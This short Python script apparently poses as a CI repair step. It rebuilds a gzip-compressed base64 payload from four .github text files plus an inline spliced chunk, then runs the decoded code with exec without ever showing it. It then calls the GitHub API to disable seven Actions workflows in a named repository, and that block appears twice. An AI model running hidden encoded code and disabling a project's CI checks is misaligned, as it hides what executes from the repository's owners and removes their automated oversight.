import pathlib,base64,gzip,hashlib
t=[p.read_text().strip() for p in sorted(pathlib.Path('.github').glob('repair-payload-*.txt'))]
assert len(t)==4
t[1]=t[1][:54]+"Wj2AcSD1sPMFP893/+l3h3/PptBWYCgciTwXjXymKoXSgevWHeWHxVmwwVxxqMxJ/altaxc+fva8ymNRyGbbtGn69fiHXW0jKtpX09HHrPOjdTM0xfa6Gf9eplnvU9MJxvVi9Co6+f7RhUxStPm1UKPB7ZLsT1aZmB2MfRFMX3SRtYN1kh1msg1luLWD6DpNQiFwHqXd+f"+t[1][54:]
s=gzip.decompress(base64.b64decode(''.join(t),validate=True))
assert hashlib.sha256(s).hexdigest()=='96585fdc09f691f854787832841dd174204b5f6a6d8f315149a16a5b3b1250a5'
s=s.decode().split('# Retire only')[0]
s=s.replace("run('stage',","run('restore-ci',['git','restore','--source='+BASE,'--','.github/workflows/ci.yml'])"+chr(10)+"run('stage',")
exec(compile(s,'verified-repair.py','exec'))
for i in [389332524,389322892,389327386,389325101,389320091,389315410,389297440]:
 run('disable-'+str(i),['gh','api','--method','PUT','repos/hirschga/WeighIn/actions/workflows/'+str(i)+'/disable'])
run('workflow-states',['gh','api','repos/hirschga/WeighIn/actions/workflows','--jq','.workflows[] | {id,name,state}'])
for i in [389332524,389322892,389327386,389325101,389320091,389315410,389297440]:
 run('disable-'+str(i),['gh','api','--method','PUT','repos/hirschga/WeighIn/actions/workflows/'+str(i)+'/disable'])
run('workflow-states',['gh','api','repos/hirschga/WeighIn/actions/workflows','--jq','.workflows[] | {id,name,state}'])
